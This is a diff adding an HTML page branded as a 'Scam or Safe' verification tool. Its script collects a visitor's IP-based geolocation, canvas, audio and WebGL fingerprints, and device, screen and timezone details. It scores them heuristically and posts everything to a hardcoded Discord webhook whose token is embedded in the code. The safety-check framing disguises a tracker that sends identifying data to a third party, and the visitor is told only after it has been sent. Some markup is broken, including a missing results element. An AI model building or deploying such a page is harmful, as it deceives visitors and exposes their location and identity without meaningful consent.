@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Scam or Safe Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 30px;
+      max-width: 900px;
+      margin: 0 auto;
+      background: #0f172a;
+      color: #e5e7eb;
+    }
+    h1, h2, h3 {
+      color: #f9fafb;
+    }
+    .card {
+      background: #111827;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid #1f2937;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 6px;
+      border: none;
+      background: #2563eb;
+      color: white;
+    }
+    button:disabled {
+      background: #4b5563;
+      cursor: not-allowed;
+    }
+    .small {
+      font-size: 13px;
+      color: #9ca3af;
+    }
+    pre {
+      background: #020617;
+      padding: 15px;
+      border-radius: 6px;
+      overflow-x: auto;
+      font-size: 12px;
+      color: #e5e7eb;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .status.ok {
+      color: #22c55e;
+    }
+    .status.warn {
+      color: #f97316;
+    }
+    .status.error {
+      color: #f97373;
+    }
+    ul {
+      margin-top: 6px;
+      margin-bottom: 6px;
+    }
+    li {
+      margin-bottom: 3px;
+    }
+    .score {
+      font-size: 24px;
+      font-weight: bold;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Scam or Safe – Verification Tool</h1>
+
+    <button id="runBtn">Run Verification</button>
+    <div id="runStatus" class="status"></div>
+  </div>
+
+  <div class="card">
+    <h2>Scam vs Safe – Heuristic Score</h2>
+    <p class="small">
+      This is a rough, heuristic score based on technical signals. It is <strong>not</strong> a definitive judgment.
+      Use it as one extra signal, not proof.
+    </p>
+    <div id="score" class="score">–</div>
+    <div id="scoreExplanation" class="small"></div>
+  </div>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1460849318389878894/ClbGdH42WUj200pA4iSDAFQYeSZfoR0UYe-WWONVp6VeHCZuUGmQGI86cD9leG5rDq_s";
+
+  const runBtn = document.getElementById("runBtn");
+  const runStatus = document.getElementById("runStatus");
+  const resultsEl = document.getElementById("results");
+  const scoreEl = document.getElementById("score");
+  const scoreExplanationEl = document.getElementById("scoreExplanation");
+
+  function setStatus(message, type = "ok") {
+    runStatus.textContent = message;
+    runStatus.className = "status " + type;
+  }
+
+  function detectAdblock() {
+    const bait = document.createElement("div");
+    bait.className = "ad-banner ad advertisment adsbox sponsor";
+    bait.style.height = "1px";
+    bait.style.position = "absolute";
+    bait.style.left = "-9999px";
+    document.body.appendChild(bait);
+    const blocked = getComputedStyle(bait).display === "none" || bait.offsetParent === null;
+    document.body.removeChild(bait);
+    return blocked;
+  }
+
+  function detectTrackingProtection() {
+    try {
+      // Very rough heuristic: some tracking protection blocks certain known domains.
+      // We just attempt a fetch to a commonly blocked domain and see if it errors quickly.
+      // NOTE: This is a soft signal, not definitive.
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 1500);
+      return fetch("https://example-tracking-domain.invalid/test.js", { signal: controller.signal })
+        .then(() => {
+          clearTimeout(timeout);
+          return false; // likely not blocked (or just unreachable normally)
+        })
+        .catch(() => {
+          clearTimeout(timeout);
+          return true; // could be blocked or just unreachable
+        });
+    } catch (e) {
+      return Promise.resolve(null);
+    }
+  }
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent || "";
+    let browser = "Unknown";
+    if (ua.includes("Firefox/")) browser = "Firefox";
+    else if (ua.includes("Edg/")) browser = "Edge";
+    else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
+    else if (ua.includes("Safari/") && !ua.includes("Chrome/")) browser = "Safari";
+    else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
+
+    return {
+      userAgent: ua,
+      browserGuess: browser,
+      platform: navigator.platform || "unknown"
+    };
+  }
+
+  function getWebGLInfo() {
+    const out = {
+      supported: false,
+      vendor: "unknown",
+      renderer: "unknown"
+    };
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      if (!gl) return out;
+      out.supported = true;
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (debugInfo) {
+        out.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        out.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    } catch (e) {}
+    return out;
+  }
+
+  function getCanvasFingerprint() {
+    try {
+      const c = document.createElement("canvas");
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.textBaseline = "alphabetic";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("fingerprint_test_string", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+      ctx.fillText("fingerprint_test_string", 4, 17);
+      return c.toDataURL();
+    } catch (e) {
+      return "Unavailable";
+    }
+  }
+
+  function getAudioFingerprint() {
+    return new Promise((resolve) => {
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContext) {
+          resolve("Unavailable (no AudioContext)");
+          return;
+        }
+        const ctx = new AudioContext();
+        const oscillator = ctx.createOscillator();
+        const analyser = ctx.createAnalyser();
+        oscillator.type = "triangle";
+        oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
+        oscillator.connect(analyser);
+        analyser.connect(ctx.destination);
+        oscillator.start(0);
+
+        setTimeout(() => {
+          const freqData = new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(freqData);
+          oscillator.stop();
+          ctx.close();
+          resolve(Array.from(freqData.slice(0, 32)));
+        }, 150);
+      } catch (e) {
+        resolve("Unavailable (error)");
+      }
+    });
+  }
+
+  function getBasicInfo() {
+    const now = new Date();
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const browserInfo = getBrowserInfo();
+    const webgl = getWebGLInfo();
+
+    return {
+      timestamp: now.toISOString(),
+      localTime: now.toString(),
+      timezone: tz || "unknown",
+      timeOffsetMinutes: now.getTimezoneOffset(),
+
+      browser: {
+        userAgent: browserInfo.userAgent,
+        browserGuess: browserInfo.browserGuess,
+        platform: browserInfo.platform,
+        languages: navigator.languages || [],
+        language: navigator.language || "unknown"
+      },
+
+      device: {
+        hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+        deviceMemory: navigator.deviceMemory || "unknown",
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || "unspecified",
+      },
+
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio || 1,
+        windowInnerWidth: window.innerWidth,
+        windowInnerHeight: window.innerHeight
+      },
+
+      touchSupport: {
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        touchEvent: "ontouchstart" in window,
+        msTouchPoints: navigator.msMaxTouchPoints || 0
+      },
+
+      webgl: webgl,
+
+      referrer: document.referrer || ""
+    };
+  }
+
+  function getNetworkInfo() {
+    return fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => ({
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        org: data.org,
+        asn: data.asn
+      }))
+      .catch(() => ({
+        ip: "Error fetching IP",
+        city: null,
+        region: null,
+        country: null,
+        org: null,
+        asn: null
+      }));
+  }
+
+  function computeRiskScore(collected) {
+    // Simple heuristic scoring: 0 (safe) to 100 (high risk)
+    let score = 20; // start in the "neutral" zone
+
+    const reasons = [];
+
+    const net = collected.network || {};
+    const geo = [net.city, net.region, net.country].filter(Boolean).join(", ");
+
+    // Hosting / datacenter ISP indicator
+    if (net.org && /hosting|data center|datacenter|server|cloud|vps|ovh|digitalocean|aws|amazon|google cloud|azure/i.test(net.org)) {
+      score += 25;
+      reasons.push("Network appears to be from a hosting/datacenter provider (common for VPNs/servers).");
+    }
+
+    // Missing or error IP
+    if (!net.ip || net.ip === "Error fetching IP") {
+      score += 10;
+      reasons.push("Unable to determine IP/geo information.");
+    }
+
+    // Very small or generic screen resolutions often show up in VMs / remote desktops
+    const screen = collected.screen || {};
+    if (screen.width && screen.height) {
+      const res = screen.width + "x" + screen.height;
+      if (["800x600", "1024x768", "1280x720"].includes(res)) {
+        score += 10;
+        reasons.push("Screen resolution looks like a low/default setting (possible VM/remote session).");
+      }
+    }
+
+    // WebGL renderer hints at VMs
+    const webgl = collected.webgl || {};
+    if (webgl.supported && webgl.renderer && /vmware|virtualbox|llvmpipe|softpipe|google swiftshader/i.test(webgl.renderer)) {
+      score += 20;
+      reasons.push("GPU / WebGL renderer suggests a virtual or emulated graphics environment.");
+    }
+
+    // Adblock / tracking protection: not inherently bad, but scammers often harden their environments
+    if (collected.adblockDetected === true) {
+      score += 5;
+      reasons.push("Ad-block appears active (not bad by itself, but can be part of hardened setups).");
+    }
+    if (collected.trackingProtection === true) {
+      score += 5;
+      reasons.push("Tracking protection appears active.");
+    }
+
+    // Touch mismatch: claims to be mobile but has no touch support
+    const ts = collected.touchSupport || {};
+    const browser = collected.browser || {};
+    if (browser.userAgent && /Android|iPhone|iPad|iPod/i.test(browser.userAgent)) {
+      if (!ts.maxTouchPoints || ts.maxTouchPoints === 0) {
+        score += 10;
+        reasons.push("User agent looks mobile but no touch support is detected.");
+      }
+    }
+
+    // Clamp score
+    if (score < 0) score = 0;
+    if (score > 100) score = 100;
+
+    let summary;
+    if (score <= 30) {
+      summary = "Environment looks typical/low‑risk based on technical signals alone.";
+    } else if (score <= 60) {
+      summary = "Environment shows mixed signals. Use extra caution and verify manually.";
+    } else {
+      summary = "Environment shows multiple high‑risk indicators. Treat as potentially unsafe/scammy.";
+    }
+
+    return { score, summary, reasons, geo };
+  }
+
+  async function runVerification() {
+    runBtn.disabled = true;
+    setStatus("Running verification… please wait.", "ok");
+    resultsEl.textContent = "Collecting data…";
+
+    try {
+      const basic = getBasicInfo();
+      const [network, canvasFingerprint, audioFingerprint, adblockDetected, trackingProtection] = await Promise.all([
+        getNetworkInfo(),
+        getCanvasFingerprint(),
+        getAudioFingerprint(),
+        Promise.resolve(detectAdblock()),
+        detectTrackingProtection()
+      ]);
+
+      const collected = {
+        timestamp: basic.timestamp,
+        localTime: basic.localTime,
+        timezone: basic.timezone,
+        timeOffsetMinutes: basic.timeOffsetMinutes,
+        referrer: basic.referrer,
+
+        network: network,
+        browser: basic.browser,
+        device: basic.device,
+        screen: basic.screen,
+        touchSupport: basic.touchSupport,
+        webgl: basic.webgl,
+
+        canvasFingerprint: canvasFingerprint,
+        audioFingerprint: audioFingerprint,
+        adblockDetected: adblockDetected,
+        trackingProtection: trackingProtection,
+
+        meta: {
+          description: "Technical environment data for Scam/Safe heuristic check.",
+          version: "1.0"
+        }
+      };
+
+      // Compute heuristic "scam vs safe" score
+      const risk = computeRiskScore(collected);
+      collected.riskScore = risk.score;
+      collected.riskSummary = risk.summary;
+      collected.riskReasons = risk.reasons;
+
+      // Display locally
+      resultsEl.textContent = JSON.stringify(collected, null, 2);
+      scoreEl.textContent = risk.score + " / 100";
+      scoreExplanationEl.textContent = risk.summary 
+        + (risk.geo ? " Approximate location: " + risk.geo + "." : "")
+        + (risk.reasons.length ? " Reasons:\n- " + risk.reasons.join("\n- ") : "");
+
+      // Send to Discord webhook (transparent: same data you see)
+      const fields = [];
+
+      fields.push({
+        name: "Risk Score",
+        value: risk.score + " / 100\n" + risk.summary,
+        inline: false
+      });
+
+      if (network && network.ip) {
+        fields.push({
+          name: "Network",
+          value: `IP: ${network.ip || "unknown"}
+City/Region/Country: ${[network.city, network.region, network.country].filter(Boolean).join(", ") || "unknown"}
+Org/ASN: ${network.org || "unknown"} / ${network.asn || "unknown"}`,
+          inline: false
+        });
+      }
+
+      fields.push({
+        name: "Browser & Device",
+        value:
+          `UA: ${basic.browser.userAgent}
+Browser Guess: ${basic.browser.browserGuess}
+Platform: ${basic.browser.platform}
+CPU Cores: ${basic.device.hardwareConcurrency}
+RAM (approx): ${basic.device.deviceMemory}
+Languages: ${(basic.browser.languages || []).join(", ") || "unknown"}`,
+        inline: false
+      });
+
+      fields.push({
+        name: "Screen & Environment",
+        value:
+          `Screen: ${basic.screen.width}x${basic.screen.height}
+Window: ${basic.screen.windowInnerWidth}x${basic.screen.windowInnerHeight}
+Timezone: ${basic.timezone} (offset ${basic.timeOffsetMinutes} min)
+Local Time: ${basic.localTime}`,
+        inline: false
+      });
+
+      fields.push({
+        name: "WebGL & Fingerprints",
+        value:
+          `WebGL Supported: ${basic.webgl.supported}
+Vendor: ${basic.webgl.vendor}
+Renderer: ${basic.webgl.renderer}
+Canvas Fingerprint: ${typeof canvasFingerprint === "string" ? canvasFingerprint.slice(0, 80) + "..." : "unavailable"}
+Audio Fingerprint Sample: ${Array.isArray(audioFingerprint) ? audioFingerprint.slice(0, 8).join(", ") + "..." : audioFingerprint}`,
+        inline: false
+      });
+
+      fields.push({
+        name: "Protections & Signals",
+        value:
+          `Adblock Detected: ${adblockDetected}
+Tracking Protection (heuristic): ${trackingProtection}
+Touch Support: maxPoints=${basic.touchSupport.maxTouchPoints}, touchEvent=${basic.touchSupport.touchEvent}`,
+        inline: false
+      });
+
+      const payload = {
+        username: "Scam or Safe Verification",
+        content: "**New verification result**",
+        embeds: [{
+          title: "Technical Environment Report",
+          description: "All data shown on the page is also included in this report.",
+          color: 3447003,
+          fields: fields,
+          timestamp: basic.timestamp
+        }]
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      setStatus("Verification complete. Data displayed below and sent to Discord.", "ok");
+    } catch (e) {
+      console.error(e);
+      setStatus("Error during verification. Check console for details.", "error");
+      resultsEl.textContent = "An error occurred while collecting data.";
+    } finally {
+      runBtn.disabled = false;
+    }
+  }
+
+  runBtn.addEventListener("click", runVerification);
+</script>
+
+</body>
+</html>
